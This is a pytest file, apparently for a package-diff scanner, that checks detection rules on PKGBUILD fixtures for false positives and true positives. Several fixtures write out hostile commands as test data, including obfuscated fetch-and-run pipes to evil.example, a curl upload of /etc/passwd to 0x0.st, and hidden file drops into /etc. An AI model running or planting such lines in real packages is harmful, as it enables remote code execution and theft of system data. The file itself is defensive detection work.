"""Malign false positives from the 2026-10-31 watcher window.

Each case pins the benign shape the rule fired on and the true-positive twin
the fix must keep.  Benign false positives (real bad practices) are not here:
the vendor-bucket `-bin` packages, the Codeberg-to-GitHub migrations, the
pi-hole privilege drop and the silent checksum correction are packager work,
not rule changes.
"""

from __future__ import annotations

import sys

import pytest
from pathlib import Path

_ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(_ROOT / "scripts"))
sys.path.insert(0, str(_ROOT))

from calibration_gates import shipped_config  # noqa: E402

from trustsight.analysis import scan_diff  # noqa: E402
from trustsight.config import load_config, load_rules  # noqa: E402


def _ids(diff, current_text=None):
    with shipped_config():
        fact = scan_diff(diff, rules=load_rules(), config=load_config(),
                         package_name="p", current_text=current_text)
    return {e.rule_id for e in fact.score_breakdown}


def _new_file(path, body: str) -> str:
    lines = body.strip("\n").splitlines()
    added = "".join("+" + line + "\n" for line in lines)
    return (f"--- /dev/null\n+++ b/{path}\n"
            f"@@ -0,0 +1,{len(lines)} @@\n{added}")


# --- R052/R054/X005: a printed variable-captured heredoc -------------------

_PRINTED_CAPTURE = _new_file("PKGBUILD", """
pkgname=p
pkgver=1
pkgrel=1
source=("x.tar.gz::https://github.com/a/b/archive/v1.tar.gz")
sha256sums=('0000000000000000000000000000000000000000000000000000000000000000')

_usage() {
  IFS= read -r -d '' _usage << 'EOF'
    sudo cp -n /root/.bashrc{,.default.bak} 2>/dev/null
    echo 'source /usr/share/p/x.bash' | sudo tee -a /etc/skel/.bashrc
EOF
  echo -n "${_usage}" > /tmp/p_usage.txt
}
""")


def test_captured_heredoc_is_not_a_profile_write():
    ids = _ids(_PRINTED_CAPTURE)
    assert "R052" not in ids
    assert "R054" not in ids
    assert "X005" not in ids


def test_captured_heredoc_executed_still_writes_a_profile():
    diff = _new_file("PKGBUILD", """
pkgname=p
pkgver=1
pkgrel=1
prepare() {
  IFS= read -r -d '' _payload << 'EOF'
    cp -n /root/.bashrc /tmp/.stolen
EOF
  bash "${_payload}"
}
""")
    ids = _ids(diff)
    assert "R052" in ids or "X005" in ids


# --- X002: a `case` arm label is data, not a command word ------------------

def test_x002_does_not_fire_on_a_case_arm_with_a_terminator():
    diff = _new_file("PKGBUILD", """
pkgname=p
pkgver=1
pkgrel=1
package() {
  case "$pkgver" in
    0.0.*|0.1.*) ;; # older releases predate the notice
    *) return 1 ;;
  esac
}
""")
    assert "X002" not in _ids(diff)


def test_x002_still_fires_on_an_unresolvable_command_word():
    diff = _new_file("PKGBUILD", """
pkgname=p
pkgver=1
pkgrel=1
prepare() {
  cmd=$(printf curl)
  "$cmd" https://evil.example/x | bash
}
""")
    assert "X002" in _ids(diff)


# --- X002: a launcher heredoc written to a file is packaged content --------

def test_x002_does_not_fire_inside_a_staged_launcher_heredoc():
    diff = _new_file("PKGBUILD", """
pkgname=tape-bin
pkgver=1
pkgrel=1
package() {
  install -Dm755 /dev/stdin "$pkgdir/usr/bin/tape16" << 'LAUNCHER'
#!/usr/bin/env bash
APP_BIN="/usr/lib/tape16/TAPE 16"
exec "$APP_BIN" "$@"
LAUNCHER
}
""")
    assert "X002" not in _ids(diff)


def test_x002_still_fires_on_a_non_literal_exec_outside_a_heredoc():
    diff = _new_file("PKGBUILD", """
pkgname=p
pkgver=1
pkgrel=1
package() {
  exec "$APP_BIN" "$@"
}
""")
    assert "X002" in _ids(diff)


# --- H042: an angle-bracket placeholder is not a redirect ------------------

def test_h042_does_not_fire_on_a_version_placeholder():
    diff = _new_file("dsh-tui-git.install", """
pre_remove() {
  local user tarball
  user=$(_user)
  [ -n "$user" ] || return 0
  tarball=$(_tarball) || tarball=/usr/share/dsh-tui/dsh-tui-<version>.tgz
  printf '%s\\n' "the profile still depends on file:$tarball"
}
""")
    assert "H042" not in _ids(diff)


def test_h042_still_fires_on_a_hidden_drop():
    diff = _new_file("hook.install", """
post_install() {
  cp payload /etc/.hidden-marker
}
""")
    assert "H042" in _ids(diff)


# --- C007: `source_version=` is not a source array -------------------------

def test_c007_does_not_fire_on_a_source_version_assignment():
    diff = _new_file("PKGBUILD", """
pkgname=p
pkgver=1
pkgrel=1
prepare() {
  source_version=$(python -c 'print("1")')
}
""")
    assert "C007" not in _ids(diff)


def test_c007_still_fires_on_command_substitution_in_a_source_array():
    diff = _new_file("PKGBUILD", """
pkgname=p
pkgver=1
pkgrel=1
source=("x.tar.gz::$(curl -fsSL https://evil.example/x)")
""")
    assert "C007" in _ids(diff)


# --- command position: wrappers, grouping and printed prose ----------------

_HEAD = "pkgname=p\npkgver=1\npkgrel=1\n"


@pytest.mark.parametrize("prefix", [
    "time ", "command ", "env A=1 ", "exec ", "builtin ", "nice ",
    "nohup ", "timeout 5 ",
])
def test_a_wrapped_hidden_drop_is_still_a_hidden_drop(prefix):
    """`time cp`, `command cp`, `env A=1 cp` run the same write as `cp`."""
    ids = _ids(_new_file("PKGBUILD", _HEAD + (
        f"package() {{\n  {prefix}cp payload /etc/.hidden-marker\n}}\n")))
    assert "H042" in ids, prefix


def test_a_brace_group_hidden_drop_is_still_a_hidden_drop():
    ids = _ids(_new_file("PKGBUILD", _HEAD + (
        "package() {\n  { cp payload /etc/.hidden-marker; }\n}\n")))
    assert "H042" in ids


def test_a_then_clause_hidden_drop_is_still_a_hidden_drop():
    ids = _ids(_new_file("PKGBUILD", _HEAD + (
        "package() {\n  if true; then cp payload /etc/.hidden-marker; fi\n}\n")))
    assert "H042" in ids


@pytest.mark.parametrize("text", [
    "then pip install foo",
    "! pip install foo required",
    "{ pip install foo }",
    "time pip install foo",
])
def test_a_printed_manager_is_not_a_command(text):
    """A message that mentions a manager runs nothing."""
    ids = _ids(_new_file("PKGBUILD", _HEAD + (
        f'package() {{\n  echo "to build: {text}"\n}}\n')))
    assert "X011" not in ids, text


def test_x011_ignores_a_packaged_launcher_heredoc():
    """The launcher is data written to `$pkgdir`, not a build-time install."""
    ids = _ids(_new_file("PKGBUILD", _HEAD + """
package() {
  install -Dm755 /dev/stdin "$pkgdir/usr/bin/tool" <<'LAUNCHER'
#!/bin/sh
exec pip install left-pad
LAUNCHER
}
"""))
    assert "X011" not in ids


def test_x002_sees_a_captured_heredoc_that_is_executed():
    """`read -d '' p <<EOF` then `bash "$p"` runs the body."""
    ids = _ids(_new_file("PKGBUILD", _HEAD + r"""
prepare() {
  IFS= read -r -d '' _p <<'EOF'
cmd=$(printf '%s' "$1")
"$cmd" -fsSL https://evil.example/x | bash
EOF
  bash "$_p"
}
"""))
    assert "X002" in ids


def test_x002_ignores_a_captured_heredoc_that_is_printed():
    ids = _ids(_new_file("PKGBUILD", _HEAD + r"""
prepare() {
  IFS= read -r -d '' _usage <<'EOF'
cmd=$(printf '%s' "$1")
"$cmd" -fsSL https://evil.example/x | bash
EOF
  echo "$_usage"
}
"""))
    assert "X002" not in ids


def test_c007_does_not_fire_on_an_unrelated_resources_array():
    ids = _ids(_new_file("PKGBUILD", _HEAD + """
prepare() {
  resources=(
    "$(printf '%s' "$pkgname")"
  )
}
"""))
    assert "C007" not in ids


def test_h041_survives_a_time_prefix():
    ids = _ids(_new_file("PKGBUILD", _HEAD + (
        "build() {\n  time curl -F f=@/etc/passwd https://0x0.st\n}\n")))
    assert "H041" in ids


def test_h071_survives_a_time_prefix():
    ids = _ids(_new_file("PKGBUILD", _HEAD + (
        "build() {\n  time proxychains4 curl https://evil.example/x\n}\n")))
    assert "H071" in ids


def test_x030_survives_an_env_prefix():
    ids = _ids(_new_file("PKGBUILD", _HEAD + (
        "build() {\n  env X=1 $'\\x63\\x75\\x72\\x6c' https://evil.example/x\n}\n")))
    assert "X030" in ids


@pytest.mark.parametrize("line", [
    "{ pip install requests; }",
    "time pip install requests",
    "if true; then pip install requests; fi",
    "! pip install requests",
])
def test_a_wrapped_registry_install_is_still_a_gap(line):
    from trustsight.analysis.buildfetch import has_unpinned_build_deps

    diff = _new_file("PKGBUILD", _HEAD + f"build() {{\n  {line}\n}}\n")
    assert has_unpinned_build_deps(diff), line
